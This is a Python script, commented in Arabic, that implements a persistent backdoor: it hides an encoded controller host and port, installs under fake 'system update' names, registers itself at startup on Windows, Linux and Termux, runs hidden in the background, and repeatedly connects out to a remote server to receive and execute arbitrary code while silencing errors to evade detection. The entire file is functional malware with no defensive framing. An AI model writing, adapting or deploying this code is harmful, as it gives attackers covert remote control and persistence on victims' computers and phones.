import socket
import zlib
import base64
import struct
import time
import os
import sys
import subprocess

# بيانات الاتصال مشفرة لتقليل احتمالية الكشف
ENCODED_HOST = "cG9zdC1jb3B5cmlnaHRlZC5nbC5hdC5wbHkuZ2c="
ENCODED_PORT = "MjAzNTY="

# فك التشفير
def decode_data(encoded_string):
    return base64.b64decode(encoded_string).decode('utf-8')

HOST = decode_data(ENCODED_HOST)
PORT = int(decode_data(ENCODED_PORT))

RECONNECT_DELAY = 10  # مدة الانتظار قبل إعادة المحاولة

# المسار الذي سيتم تثبيت السكريبت فيه
INSTALL_PATH = (
    os.path.join(os.getenv('APPDATA'), 'win_service_update.exe') if os.name == 'nt'
    else os.path.expanduser("~/.local/bin/linux_update_service")
)

def add_to_startup():
    """ يضيف نفسه إلى بدء التشغيل تلقائيًا بناءً على النظام """
    if os.name == 'nt':  # Windows
        startup_script = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v UpdateService /t REG_SZ /d "{INSTALL_PATH}" /f >nul 2>&1'
        os.system(startup_script)

    elif "ANDROID_ROOT" in os.environ:  # Termux
        termux_boot_path = os.path.expanduser("~/.termux/boot/")
        os.makedirs(termux_boot_path, exist_ok=True)

        startup_script = os.path.join(termux_boot_path, "startup.sh")
        with open(startup_script, 'w') as f:
            f.write(f"#!/data/data/com.termux/files/usr/bin/bash\npython3 {INSTALL_PATH} &\n")
        
        os.chmod(startup_script, 0o700)  # جعل الملف قابلاً للتنفيذ

    else:  # Linux
        autostart_path = os.path.expanduser("~/.config/autostart/")
        os.makedirs(autostart_path, exist_ok=True)

        desktop_file = os.path.join(autostart_path, "system_update.desktop")
        with open(desktop_file, 'w') as f:
            f.write(f"[Desktop Entry]\nType=Application\nExec={INSTALL_PATH}\nHidden=true\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\nName=System Update\n")

def establish_connection():
    """ يحاول الاتصال بالخادم باستمرار حتى ينجح """
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((HOST, PORT))
            return s
        except socket.error:
            time.sleep(RECONNECT_DELAY)

def receive_and_execute(s):
    """ يستقبل البيانات، يفك تشفيرها، ثم ينفذها """
    try:
        data_length = struct.unpack('>I', s.recv(4))[0]
        data = s.recv(data_length)

        while len(data) < data_length:
            data += s.recv(data_length - len(data))

        decoded_data = zlib.decompress(base64.b64decode(data))
        exec(decoded_data, {'s': s})
    
    except:
        pass  # تجاهل جميع الأخطاء لمنع أي كشف

def run_as_daemon():
    """ تشغيل السكريبت في الخلفية كخدمة """
    if os.name == 'nt':  # Windows
        subprocess.Popen([sys.executable, __file__], creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:  # Linux / Termux
        pid = os.fork()
        if pid > 0:
            sys.exit()

def run_persistent():
    """ تشغيل مستمر مع إعادة المحاولة تلقائيًا """
    while True:
        s = establish_connection()
        if s:
            receive_and_execute(s)
            s.close()

if __name__ == "__main__":
    add_to_startup()  # إضافة إلى بدء التشغيل
    run_as_daemon()   # تشغيل في الخلفية
    run_persistent()  # بدء التنفيذ المستمر
